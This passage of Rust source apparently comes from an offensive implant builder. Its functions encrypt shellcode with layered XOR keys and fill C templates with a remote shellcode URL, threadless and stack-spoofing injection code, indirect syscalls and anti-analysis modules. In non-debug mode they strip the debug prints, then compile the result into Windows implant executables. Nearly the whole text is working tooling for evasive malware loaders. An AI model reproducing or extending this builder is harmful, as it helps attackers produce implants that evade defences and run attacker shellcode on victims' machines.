        style("[+]").green().bold()
    );

    println!(
        "{} Implant saved in: {}",
        style("[+]").green().bold(),
        style(&format!("{}/LocalCommonInj.exe", output_path))
            .yellow()
            .bold()
    );
    println!(
        "{} Encrypted shellcode saved in: {}",
        style("[+]").green().bold(),
        style(&format!("{}/shellcode.bin", output_path))
            .yellow()
            .bold()
    );
    println!(
        "{} Implant Project created at: {}",
        style("[+]").green().bold(),
        style(output_path).yellow().bold()
    );
}
pub fn write_tofile(file_path: &str, buffer: &[u8]) {
    use std::fs::File;
    use std::io::prelude::*;

    let mut file = File::create(file_path).expect("Failed to create output file");
    file.write_all(buffer)
        .expect("Failed to write to output file");
}

pub fn generate_kannthreadlessinj(
    output_path: &str,
    shellcode_path: &str,
    shellcode_url: &str,
    debug: bool,
) {
    use crate::clib::globals_h::GLOBALS_H;
    use crate::clib::indirectsyscall_asm::INDIRECTSYSCALL_ASM;
    use crate::clib::indirectsyscall_c::INDIRECTSYSCALL_C;
    use crate::clib::indirectsyscall_h::INDIRECTSYSCALL_H;
    use crate::clib::kannthreadlessinj_c::KANNTHREADLESSINJ_C;
    use crate::clib::kannthreadlessinj_h::KANNTHREADLESS_CODE;
    use crate::clib::kannthreadlessinj_h::KANNTHREADLESS_H;
    use crate::clib::kannthreadlessinj_h::KANNTHREADLESS_INCLUDE;
    use crate::clib::main_c::MAIN_C;
    use crate::clib::makefile::MAKEFILE;
    use crate::clib::proxyhelper_asm::PROXYHELPER_ASM;

    use crate::clib::process_c::PROCESS_C;
    use crate::clib::process_h::PROCESS_H;

    use crate::clib::carokannspoofstackslocalinj_h::CAROKANNSPOOFSTACKSLOCALINJ_PAYLOAD;
    use crate::clib::tool_c::TOOL_C;
    use crate::clib::tool_h::TOOL_H;

    use crate::clib::anti_c::ANTI_C;
    use crate::clib::anti_h::ANTI_H;
    use crate::clib::cjson_c::CJSON_C;
    use crate::clib::cjson_h::CJSON_H;
    use crate::clib::web_c::WEB_C;
    use crate::clib::web_h::WEB_H;
    let cjson_c = CJSON_C;
    let cjson_h = CJSON_H;
    let anti_c = ANTI_C;
    let anti_h = ANTI_H;
    let web_c = WEB_C;
    let web_h = WEB_H;
    let globals_h = GLOBALS_H;
    let indirectsyscall_asm = INDIRECTSYSCALL_ASM;
    let indirectsyscall_c = INDIRECTSYSCALL_C;
    let indirectsyscall_h = INDIRECTSYSCALL_H;

    let kannthreadlessinj_c = KANNTHREADLESSINJ_C;
    let kannthreadlessinj_h = KANNTHREADLESS_H;
    let kannthreadlessinj_code = KANNTHREADLESS_CODE;
    let kannthreadlessinj_include = KANNTHREADLESS_INCLUDE;

    let carokannspoofstackslocalinj_payload = CAROKANNSPOOFSTACKSLOCALINJ_PAYLOAD;
    let proxyhelper_asm = PROXYHELPER_ASM;

    let main_c = MAIN_C;
    let makefile = MAKEFILE;
    let tool_h = TOOL_H;
    let tool_c = TOOL_C;

    let process_h = PROCESS_H;
    let process_c = PROCESS_C;

    // read shellcode from path
    let mut file = std::fs::File::open(shellcode_path).expect("[-] File not found");
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer)
        .expect("[-] Failed to read shellcode file");

    // xor the shellcode buffer with 0x08, 0x08, 0x04, 0x08
    let xor_key = [0x08, 0x08, 0x04, 0x08];
    for i in 0..buffer.len() {
        buffer[i] ^= xor_key[i % xor_key.len()];
    }

    // get random one bit
    let hint_byte = rand::thread_rng().gen_range(0..=u8::MAX);
    print!("{} Hint Byte: ", style("[*]").green().bold());
    print_hex(&[hint_byte]);

    let mut real_key: Vec<u8> = generate_random_key();
    let mut protected_key: Vec<u8> = generate_protected_key(hint_byte, &mut real_key);

    print!("{} Original Key: ", style("[*]").green().bold());
    print_hex(&real_key);
    print!("{} Protected Key: ", style("[*]").green().bold());
    print_hex(&protected_key);

    // xor encrypt the file with the real_key
    for i in 0..buffer.len() {
        buffer[i] ^= real_key[i % real_key.len()];
    }
    // change protected_key into c array format string
    let protected_key_str = get_c_arr(&mut protected_key);
    // replace the key in main.c
    // create output folder
    std::fs::create_dir_all(output_path).expect("[-] Failed to create output folder");
    std::fs::create_dir_all(format!("{}/include", output_path))
        .expect("[-] Failed to create include folder");
    std::fs::create_dir_all(format!("{}/src", output_path))
        .expect("[-] Failed to create src folder");
    std::fs::create_dir_all(format!("{}/bin", output_path))
        .expect("[-] Failed to create src folder");

    // write to file

    if !debug {
        let main_c = main_c.replace("printf", "//printf");
        let main_c = main_c.replace("Print", "//Printf");
        let indirectsyscall_c = indirectsyscall_c.replace("printf", "//printf");
        let process_c = process_c.replace("printf", "//printf");
        let tool_c = tool_c.replace("printf", "//printf");
        let kannthreadlessinj_c = kannthreadlessinj_c.replace("printf", "//printf");
        let kannthreadlessinj_code = kannthreadlessinj_code.replace("printf", "//printf");

        let main_c = main_c.replace("{HINT_BYTE}", &format!("0x{:02X}", hint_byte));
        // replace shellcode url in main.c
        let main_c = main_c.replace("{SHELLCODE_URL}", shellcode_url);
        // replace encrypted key in main.c
        let main_c = main_c.replace("{PROTECTED_KEY}", &protected_key_str);

        let main_c = main_c.replace("{INCLUDE}", &kannthreadlessinj_include);

        let main_c = main_c.replace("{INJECTION}", &kannthreadlessinj_code);
        let main_c = main_c.replace(
            "//{CAROKANN_SHELLCODE_ARR}",
            &carokannspoofstackslocalinj_payload,
        );

        let file_length = buffer.len();
        let main_c = main_c.replace("{BUFFERSIZE}", &format!("{}", file_length));
        write_tofile(&format!("{}/src/main.c", output_path), main_c.as_bytes());
        write_tofile(
            &format!("{}/src/KannThreadlessCommonInj.c", output_path),
            kannthreadlessinj_c.as_bytes(),
        );
        write_tofile(
            &format!("{}/include/KannThreadlessCommonInj.h", output_path),
            kannthreadlessinj_h.as_bytes(),
        );
        write_tofile(&format!("{}/src/tool.c", output_path), tool_c.as_bytes());
        write_tofile(
            &format!("{}/src/indirectsyscall.c", output_path),
            indirectsyscall_c.as_bytes(),
        );
        write_tofile(
            &format!("{}/include/Tool.h", output_path),
            tool_h.as_bytes(),
        );
        write_tofile(
            &format!("{}/include/IndirectSyscall.h", output_path),
            indirectsyscall_h.as_bytes(),
        );
        write_tofile(
            &format!("{}/include/Globals.h", output_path),
            globals_h.as_bytes(),
        );
        write_tofile(
            &format!("{}/include/Process.h", output_path),
            process_h.as_bytes(),
        );
        write_tofile(
            &format!("{}/src/process.c", output_path),
            process_c.as_bytes(),
        );
        write_tofile(
            &format!("{}/bin/IndirectSyscall.asm", output_path),
            indirectsyscall_asm.as_bytes(),
        );
        write_tofile(
            &format!("{}/bin/ProxyHelper.asm", output_path),
            proxyhelper_asm.as_bytes(),
        );
        write_tofile(&format!("{}/Makefile", output_path), makefile.as_bytes());
        write_tofile(&format!("{}/shellcode.bin", output_path), &buffer);
        write_tofile(&format!("{}/src/cJSON.c", output_path), cjson_c.as_bytes());
        write_tofile(
            &format!("{}/include/cJSON.h", output_path),
            cjson_h.as_bytes(),
        );
        write_tofile(&format!("{}/src/Anti.c", output_path), anti_c.as_bytes());
        write_tofile(
            &format!("{}/include/Anti.h", output_path),
            anti_h.as_bytes(),
        );
        write_tofile(&format!("{}/src/web.c", output_path), web_c.as_bytes());

        write_tofile(&format!("{}/include/Web.h", output_path), web_h.as_bytes());
    } else {
        let main_c = main_c.replace("{HINT_BYTE}", &format!("0x{:02X}", hint_byte));
        // replace shellcode url in main.c
        let main_c = main_c.replace("{SHELLCODE_URL}", shellcode_url);
        // replace encrypted key in main.c
        let main_c = main_c.replace("{PROTECTED_KEY}", &protected_key_str);

        let main_c = main_c.replace("{INCLUDE}", &kannthreadlessinj_include);

        let main_c = main_c.replace("{INJECTION}", &kannthreadlessinj_code);
        let main_c = main_c.replace(
            "//{CAROKANN_SHELLCODE_ARR}",
            &carokannspoofstackslocalinj_payload,
        );

        let file_length = buffer.len();
        let main_c = main_c.replace("{BUFFERSIZE}", &format!("{}", file_length));
        write_tofile(&format!("{}/src/main.c", output_path), main_c.as_bytes());
        write_tofile(
            &format!("{}/src/KannThreadlessCommonInj.c", output_path),
            kannthreadlessinj_c.as_bytes(),
        );
        write_tofile(
            &format!("{}/include/KannThreadlessCommonInj.h", output_path),
            kannthreadlessinj_h.as_bytes(),
        );
        write_tofile(&format!("{}/src/tool.c", output_path), tool_c.as_bytes());
        write_tofile(
            &format!("{}/src/indirectsyscall.c", output_path),
            indirectsyscall_c.as_bytes(),
        );

        write_tofile(
            &format!("{}/include/Tool.h", output_path),
            tool_h.as_bytes(),
        );
        write_tofile(
            &format!("{}/include/IndirectSyscall.h", output_path),
            indirectsyscall_h.as_bytes(),
        );

        write_tofile(
            &format!("{}/include/Globals.h", output_path),
            globals_h.as_bytes(),
        );
        write_tofile(
            &format!("{}/include/Process.h", output_path),
            process_h.as_bytes(),
        );
        write_tofile(
            &format!("{}/src/process.c", output_path),
            process_c.as_bytes(),
        );
        write_tofile(
            &format!("{}/bin/IndirectSyscall.asm", output_path),
            indirectsyscall_asm.as_bytes(),
        );
        write_tofile(
            &format!("{}/bin/ProxyHelper.asm", output_path),
            proxyhelper_asm.as_bytes(),
        );
        write_tofile(&format!("{}/Makefile", output_path), makefile.as_bytes());
        write_tofile(&format!("{}/shellcode.bin", output_path), &buffer);
        write_tofile(&format!("{}/src/cJSON.c", output_path), cjson_c.as_bytes());
        write_tofile(
            &format!("{}/include/cJSON.h", output_path),
            cjson_h.as_bytes(),
        );
        write_tofile(&format!("{}/src/Anti.c", output_path), anti_c.as_bytes());
        write_tofile(
            &format!("{}/include/Anti.h", output_path),
            anti_h.as_bytes(),
        );
        write_tofile(&format!("{}/src/web.c", output_path), web_c.as_bytes());

        write_tofile(&format!("{}/include/Web.h", output_path), web_h.as_bytes());
    }
    // starting build project via make
    println!(
        "{} Building Implant Project...",
        style("[*]").green().bold()
    );
    println!();
    // run make with localcommoninj arg
    let output = std::process::Command::new("make")
        .current_dir(output_path)
        .arg("KannThreadlessCommonInj")
        .output()
        .expect("Failed to build project");

    println!("{} Build command output:", style("[*]").green().bold());

    println!(
        "{}",
        style(String::from_utf8_lossy(&output.stdout)).magenta()
    );
    // println!(
    //     "{}",
    //     style(String::from_utf8_lossy(&output.stderr)).magenta()
    // );
    // println!("{}", String::from_utf8_lossy(&output.stderr));
    if !output.status.success() {
        println!(
            "{} Failed to build Implant Project",
            style("[!]").red().bold()
        );
        std::process::exit(1);
    }
    println!(
        "{} Implant Project built successfully",
        style("[+]").green().bold()
    );

    println!(
        "{} Implant saved in: {}",
        style("[+]").green().bold(),
        style(&format!("{}/KannThreadlessCommonInj.exe", output_path))
            .yellow()
            .bold()
    );
    println!(
        "{} Encrypted shellcode saved in: {}",
        style("[+]").green().bold(),
        style(&format!("{}/shellcode.bin", output_path))
            .yellow()
            .bold()
    );
    println!(
        "{} Implant Project created at: {}",
        style("[+]").green().bold(),
        style(output_path).yellow().bold()
    );
}

pub fn generate_kannthreadlessstackinj(
    output_path: &str,
    shellcode_path: &str,
    shellcode_url: &str,
    debug: bool,
) {
    use crate::clib::globals_h::GLOBALS_H;
    use crate::clib::indirectsyscall_asm::INDIRECTSYSCALL_ASM;
    use crate::clib::indirectsyscall_c::INDIRECTSYSCALL_C;
    use crate::clib::indirectsyscall_h::INDIRECTSYSCALL_H;
    // use crate::clib::kannthreadlessinj_c::KANNTHREADLESSINJ_C;
    // use crate::clib::kannthreadlessinj_h::KANNTHREADLESS_CODE;
    // use crate::clib::kannthreadlessinj_h::KANNTHREADLESS_H;
    // use crate::clib::kannthreadlessinj_h::KANNTHREADLESS_INCLUDE;
    use crate::clib::kannthreadlessstackinj_c::KANNTHREADLESSSTACKINJ_C;
    use crate::clib::kannthreadlessstackinj_h::KANNTHREADLESSSTACK_CODE;
    use crate::clib::kannthreadlessstackinj_h::KANNTHREADLESSSTACK_H;
    use crate::clib::kannthreadlessstackinj_h::KANNTHREADLESSSTACK_INCLUDE;
    use crate::clib::main_c::MAIN_C;
    use crate::clib::makefile::MAKEFILE;
    use crate::clib::proxyhelper_asm::PROXYHELPER_ASM;

    use crate::clib::process_c::PROCESS_C;
    use crate::clib::process_h::PROCESS_H;

    use crate::clib::carokannspoofstackslocalinj_h::CAROKANNSPOOFSTACKSLOCALINJ_PAYLOAD;
    use crate::clib::tool_c::TOOL_C;
    use crate::clib::tool_h::TOOL_H;

    use crate::clib::anti_c::ANTI_C;
    use crate::clib::anti_h::ANTI_H;
    use crate::clib::cjson_c::CJSON_C;
    use crate::clib::cjson_h::CJSON_H;
    use crate::clib::web_c::WEB_C;
    use crate::clib::web_h::WEB_H;
    let cjson_c = CJSON_C;
    let cjson_h = CJSON_H;
    let anti_c = ANTI_C;
    let anti_h = ANTI_H;
    let web_c = WEB_C;
    let web_h = WEB_H;
    let globals_h = GLOBALS_H;
    let indirectsyscall_asm = INDIRECTSYSCALL_ASM;
    let indirectsyscall_c = INDIRECTSYSCALL_C;
    let indirectsyscall_h = INDIRECTSYSCALL_H;

    let kannthreadlessinj_c = KANNTHREADLESSSTACKINJ_C;
    let kannthreadlessinj_h = KANNTHREADLESSSTACK_H;
    let kannthreadlessinj_code = KANNTHREADLESSSTACK_CODE;
    let kannthreadlessinj_include = KANNTHREADLESSSTACK_INCLUDE;

    // let kannthreadlessinj_h = KANNTHREADLESS_H;
    // let kannthreadlessinj_code = KANNTHREADLESS_CODE;
    // let kannthreadlessinj_include = KANNTHREADLESS_INCLUDE;

    let carokannspoofstackslocalinj_payload = CAROKANNSPOOFSTACKSLOCALINJ_PAYLOAD;
    let proxyhelper_asm = PROXYHELPER_ASM;

    let main_c = MAIN_C;
    let makefile = MAKEFILE;
    let tool_h = TOOL_H;
    let tool_c = TOOL_C;

    let process_h = PROCESS_H;
    let process_c = PROCESS_C;

    // if debug is false, we delete all print statements

    // if !debug {
    //     println!("{} Debug mode enabled", style("[*]").green().bold());
    //     main_c = &main_c.replace("printf", "//printf").clone();
    //     let main_c = &main_c.replace("Print", "//Printf");
    //     let decrypt_c = decrypt_c.replace("printf", "//printf");
    //     let indirectsyscall_c = indirectsyscall_c.replace("printf", "//printf");
    //     let download_c = download_c.replace("printf", "//printf");
    //     let process_c = process_c.replace("printf", "//printf");
    //     let tool_c = tool_c.replace("printf", "//printf");
    //     let kannthreadlessinj_c = kannthreadlessinj_c.replace("printf", "//printf");
    //     let kannthreadlessinj_code = kannthreadlessinj_code.replace("printf", "//printf");
    // }
    // read shellcode from path
    let mut file = std::fs::File::open(shellcode_path).expect("[-] File not found");
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer)
        .expect("[-] Failed to read shellcode file");

    // xor the shellcode buffer with 0x08, 0x08, 0x04, 0x08
    let xor_key = [0x08, 0x08, 0x04, 0x08];
    for i in 0..buffer.len() {
        buffer[i] ^= xor_key[i % xor_key.len()];
    }

    // get random one bit
    let hint_byte = rand::thread_rng().gen_range(0..=u8::MAX);
    print!("{} Hint Byte: ", style("[*]").green().bold());
    print_hex(&[hint_byte]);

    let mut real_key: Vec<u8> = generate_random_key();
    let mut protected_key: Vec<u8> = generate_protected_key(hint_byte, &mut real_key);

    print!("{} Original Key: ", style("[*]").green().bold());
    print_hex(&real_key);
    print!("{} Protected Key: ", style("[*]").green().bold());
    print_hex(&protected_key);

    // xor encrypt the file with the real_key
    for i in 0..buffer.len() {
        buffer[i] ^= real_key[i % real_key.len()];
    }
    // change protected_key into c array format string
    let protected_key_str = get_c_arr(&mut protected_key);
    // replace the key in main.c
    // create output folder
    std::fs::create_dir_all(output_path).expect("[-] Failed to create output folder");
    std::fs::create_dir_all(format!("{}/include", output_path))
        .expect("[-] Failed to create include folder");
    std::fs::create_dir_all(format!("{}/src", output_path))
        .expect("[-] Failed to create src folder");
    std::fs::create_dir_all(format!("{}/bin", output_path))
        .expect("[-] Failed to create src folder");

    // if debug enable
    if debug {
        let main_c = main_c.replace("{HINT_BYTE}", &format!("0x{:02X}", hint_byte));
        // replace shellcode url in main.c
        let main_c = main_c.replace("{SHELLCODE_URL}", shellcode_url);
        // replace encrypted key in main.c
        let main_c = main_c.replace("{PROTECTED_KEY}", &protected_key_str);

        let main_c = main_c.replace("{INCLUDE}", &kannthreadlessinj_include);

        let main_c = main_c.replace("{INJECTION}", &kannthreadlessinj_code);
        let main_c = main_c.replace(
            "//{CAROKANN_SHELLCODE_ARR}",
            &carokannspoofstackslocalinj_payload,
        );

        let file_length = buffer.len();
        let main_c = main_c.replace("{BUFFERSIZE}", &format!("{}", file_length));
        // write to file
        write_tofile(&format!("{}/src/main.c", output_path), main_c.as_bytes());
        write_tofile(
            &format!("{}/src/KannThreadStackInj.c", output_path),
            kannthreadlessinj_c.as_bytes(),
        );
        write_tofile(
            &format!("{}/include/KannThreadStackInj.h", output_path),
            kannthreadlessinj_h.as_bytes(),
        );
        write_tofile(&format!("{}/src/tool.c", output_path), tool_c.as_bytes());
        write_tofile(
            &format!("{}/src/indirectsyscall.c", output_path),
            indirectsyscall_c.as_bytes(),
        );

        write_tofile(
            &format!("{}/include/Tool.h", output_path),
            tool_h.as_bytes(),
        );
        write_tofile(
            &format!("{}/include/IndirectSyscall.h", output_path),
            indirectsyscall_h.as_bytes(),
        );

        write_tofile(
            &format!("{}/include/Globals.h", output_path),
            globals_h.as_bytes(),
        );
        write_tofile(
            &format!("{}/include/Process.h", output_path),
            process_h.as_bytes(),
        );
        write_tofile(
            &format!("{}/src/process.c", output_path),
            process_c.as_bytes(),
        );
        write_tofile(
            &format!("{}/bin/IndirectSyscall.asm", output_path),
            indirectsyscall_asm.as_bytes(),
        );
        write_tofile(
            &format!("{}/bin/ProxyHelper.asm", output_path),
            proxyhelper_asm.as_bytes(),
        );
        write_tofile(&format!("{}/Makefile", output_path), makefile.as_bytes());
        write_tofile(&format!("{}/shellcode.bin", output_path), &buffer);
        write_tofile(&format!("{}/src/cJSON.c", output_path), cjson_c.as_bytes());
        write_tofile(
            &format!("{}/include/cJSON.h", output_path),
            cjson_h.as_bytes(),
        );
        write_tofile(&format!("{}/src/Anti.c", output_path), anti_c.as_bytes());
        write_tofile(
            &format!("{}/include/Anti.h", output_path),
            anti_h.as_bytes(),
        );
        write_tofile(&format!("{}/src/web.c", output_path), web_c.as_bytes());

        write_tofile(&format!("{}/include/Web.h", output_path), web_h.as_bytes());
    } else {
        let main_c = main_c.replace("printf", "//printf").clone();
        let main_c = main_c.replace("Print", "//Printf");
        let indirectsyscall_c = indirectsyscall_c.replace("printf", "//printf");

        let process_c = process_c.replace("wprintf", "//printf");
        let process_c = process_c.replace("printf", "//printf");
        let tool_c = tool_c.replace("printf", "//printf");
        let kannthreadlessinj_c = kannthreadlessinj_c.replace("printf", "//printf");
        let kannthreadlessinj_code = kannthreadlessinj_code.replace("printf", "//printf");

        let main_c = main_c.replace("{HINT_BYTE}", &format!("0x{:02X}", hint_byte));
        // replace shellcode url in main.c
        let main_c = main_c.replace("{SHELLCODE_URL}", shellcode_url);
        // replace encrypted key in main.c
        let main_c = main_c.replace("{PROTECTED_KEY}", &protected_key_str);

        let main_c = main_c.replace("{INCLUDE}", &kannthreadlessinj_include);

        let main_c = main_c.replace("{INJECTION}", &kannthreadlessinj_code);
        let main_c = main_c.replace(
            "//{CAROKANN_SHELLCODE_ARR}",
            &carokannspoofstackslocalinj_payload,
        );

        let file_length = buffer.len();
        let main_c = main_c.replace("{BUFFERSIZE}", &format!("{}", file_length));
        // write to file
        write_tofile(&format!("{}/src/main.c", output_path), main_c.as_bytes());
        write_tofile(
            &format!("{}/src/KannThreadStackInj.c", output_path),
            kannthreadlessinj_c.as_bytes(),
        );
        write_tofile(
            &format!("{}/include/KannThreadStackInj.h", output_path),
            kannthreadlessinj_h.as_bytes(),
        );
        write_tofile(&format!("{}/src/tool.c", output_path), tool_c.as_bytes());
        write_tofile(
            &format!("{}/src/indirectsyscall.c", output_path),
            indirectsyscall_c.as_bytes(),
        );
        write_tofile(
            &format!("{}/include/Tool.h", output_path),
            tool_h.as_bytes(),
        );
        write_tofile(
            &format!("{}/include/IndirectSyscall.h", output_path),
            indirectsyscall_h.as_bytes(),
        );
        write_tofile(
            &format!("{}/include/Globals.h", output_path),
            globals_h.as_bytes(),
        );
        write_tofile(
            &format!("{}/include/Process.h", output_path),
            process_h.as_bytes(),
        );
        write_tofile(
            &format!("{}/src/process.c", output_path),
            process_c.as_bytes(),
        );
        write_tofile(
            &format!("{}/bin/IndirectSyscall.asm", output_path),
            indirectsyscall_asm.as_bytes(),
        );
        write_tofile(
            &format!("{}/bin/ProxyHelper.asm", output_path),
            proxyhelper_asm.as_bytes(),
        );
        write_tofile(&format!("{}/Makefile", output_path), makefile.as_bytes());
        write_tofile(&format!("{}/shellcode.bin", output_path), &buffer);
        write_tofile(&format!("{}/src/cJSON.c", output_path), cjson_c.as_bytes());
        write_tofile(
            &format!("{}/include/cJSON.h", output_path),
            cjson_h.as_bytes(),
        );
        write_tofile(&format!("{}/src/Anti.c", output_path), anti_c.as_bytes());
        write_tofile(
            &format!("{}/include/Anti.h", output_path),
            anti_h.as_bytes(),
        );
        write_tofile(&format!("{}/src/web.c", output_path), web_c.as_bytes());

        write_tofile(&format!("{}/include/Web.h", output_path), web_h.as_bytes());
    }
    // starting build project via make
    println!(
        "{} Building Implant Project...",
        style("[*]").green().bold()
    );
    println!();
    // run make with localcommoninj arg
    let output = std::process::Command::new("make")
        .current_dir(output_path)
        .arg("KannThreadlessStackInj")
        .output()
        .expect("Failed to build project");

    println!("{} Build command output:", style("[*]").green().bold());

    println!(
        "{}",
        style(String::from_utf8_lossy(&output.stdout)).magenta()
    );
    // println!(
    //     "{}",
    //     style(String::from_utf8_lossy(&output.stderr)).magenta()
    // );
    // println!("{}", String::from_utf8_lossy(&output.stderr));
    if !output.status.success() {
        println!(
            "{} Failed to build Implant Project",
            style("[!]").red().bold()
        );
        std::process::exit(1);
    }
    println!(
        "{} Implant Project built successfully",
        style("[+]").green().bold()
    );

    println!(
        "{} Implant saved in: {}",
        style("[+]").green().bold(),
        style(&format!("{}/KannThreadlessStackInj.exe", output_path))
            .yellow()
            .bold()
    );
    println!(
        "{} Encrypted shellcode saved in: {}",
        style("[+]").green().bold(),
        style(&format!("{}/shellcode.bin", output_path))
            .yellow()
            .bold()
    );
    println!(
        "{} Implant Project created at: {}",
        style("[+]").green().bold(),
        style(output_path).yellow().bold()
    );
}
